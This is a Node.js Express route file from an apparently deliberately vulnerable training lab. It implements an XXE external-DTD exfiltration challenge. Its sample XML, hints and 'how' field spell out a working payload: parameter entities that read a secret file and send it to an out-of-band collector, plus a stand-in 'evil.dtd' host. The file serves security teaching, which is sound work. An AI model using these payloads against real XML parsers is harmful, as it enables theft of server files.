'use strict';
// External DTD exfiltration: the dtd endpoint honors an external DTD pulled in
// through a parameter entity and expands parameter entities declared inside
// that DTD, so a hosted DTD can read the module secret and make the server
// exfiltrate it out-of-band to the OOB collector.
const express = require('express');
const { page, esc, brief, hintBox, flagBox, fixPanel } = require('../../../lib/page');
const { award } = require('../../../lib/flags');
// Module-level state and helpers live in modules/xxe/shared.js (created by the
// finisher): oobLog is the shared OOB pingback log (same array identity used
// by the collector routes), SECRET_ABS points at modules/xxe/secret.txt, and
// expandExternalDtd is the external-DTD expander from router.js. The collector
// routes (/xxe/collector, /xxe/collector/log, /xxe/collector/dtd) must also be
// wired by the finisher; this file only links to them.
const { expandExternalDtd, SECRET_ABS, oobLog } = require('../shared');

const router = express.Router();

// GET /xxe/dtd -> the external DTD challenge form.
router.get('/dtd', (req, res) => {
  const base = `http://${req.get('host')}`;
  const sample = `<!DOCTYPE r [\n<!ENTITY % dtd SYSTEM "${base}/xxe/collector/dtd">\n%dtd;\n]>\n<data>&pingback;</data>`;
  res.send(page('External DTD', `
    <h2>External DTD exfiltration</h2>
    ${brief('Challenge', `
      <p>This endpoint honors an <b>external DTD</b> pulled in through a parameter entity,
      and expands parameter entities declared <b>inside</b> that DTD. Your DTD can read a
      local file into <code>%file;</code> and then make the server request a URL with the
      file content in it.</p>
      <p><b>Plan:</b> 1) host your malicious DTD on the <a href="/xxe/collector">OOB collector</a>,
      2) submit the XML below so the server fetches your DTD, 3) watch the pingback land in
      the collector log with the secret in it.</p>`)}
    <form class="clay-card" method="POST" action="/xxe/dtd">
      <div class="clay-field">
        <label for="xxe-dtd-xml">XML payload</label>
        <textarea class="clay-input" id="xxe-dtd-xml" name="xml" rows="10">${esc(sample)}</textarea>
      </div>
      <button class="clay-btn clay-btn-primary" type="submit">Import XML</button>
    </form>
    ${hintBox('Your DTD needs two declarations: <code>&lt;!ENTITY % file SYSTEM "file://' + esc(SECRET_ABS) + '"&gt;</code> and <code>&lt;!ENTITY pingback SYSTEM "' + esc(base) + '/xxe/collector/log?d=%file;"&gt;</code>. The starter template on the collector page has it ready to paste.')}
  `));
});

// POST /xxe/dtd -> expand the external DTD, award only when this request made
// the server exfiltrate the secret to the collector.
router.post('/dtd', async (req, res) => {
  const xml = String(req.body.xml || '').slice(0, 20000);
  const before = oobLog.length;
  const expanded = await expandExternalDtd(xml);
  const hits = oobLog.slice(before).filter((e) => e.d.includes('XXE-SECRET-4471'));
  let flags = '';
  // VULN: award only when this request made the server exfiltrate the secret to the collector.
  if (hits.length > 0) {
    flags += flagBox(award(req, 'xxe', 'xxe-external-dtd'));
    flags += fixPanel('xxe', 'xxe-external-dtd');
  }
  const dataMatch = expanded.match(/<data[^>]*>([\s\S]*?)<\/data>/i);
  const shown = dataMatch ? dataMatch[1] : expanded;
  res.send(page('External DTD', `
    <h2>Import result</h2>
    ${flags}
    <div class="clay-card">
      <p>Pingbacks to the collector from this request carrying the secret: <b>${hits.length}</b>.
      (<a href="/xxe/collector">view the collector log</a>)</p>
      <h3>Parsed content</h3>
      <pre>${esc(shown.slice(0, 2000))}</pre>
    </div>
    <p><a class="clay-btn clay-btn-secondary clay-btn-sm" href="/xxe/dtd">&larr; Try again</a>
    <a class="clay-btn clay-btn-secondary clay-btn-sm" href="/xxe">Back to module</a></p>
  `));
});

module.exports = {
  vuln: {
    id: 'xxe-external-dtd',
    name: 'External DTD Exfiltration',
    difficulty: 'Medium',
    hint: 'Host a malicious DTD on the in-lab OOB collector, pull it in with a parameter entity, and make the DTD ping the collector back with the file content in the URL.',
    hints: ["The DTD doesn't have to be inline. Can it be fetched from a URL?", "An external DTD (SYSTEM \"http://your-server/evil.dtd\") lets you define parameter entities that exfiltrate file content OOB.", "Host a DTD that reads the secret and pings your collector. The flag lands when the collector receives it."],
    tools: "C",
    how: 'Upload a DTD that reads secret.txt into %file; and declares a pingback entity to /xxe/collector/log?d=%file;, then import XML that fetches your DTD.',
    link: '/xxe#xxe-external-dtd',
    start: 'curl -s http://localhost:3000/xxe/dtd\ncurl -s -X POST --data-urlencode xml@payload.xml http://localhost:3000/xxe/dtd',
  },
  router,
};
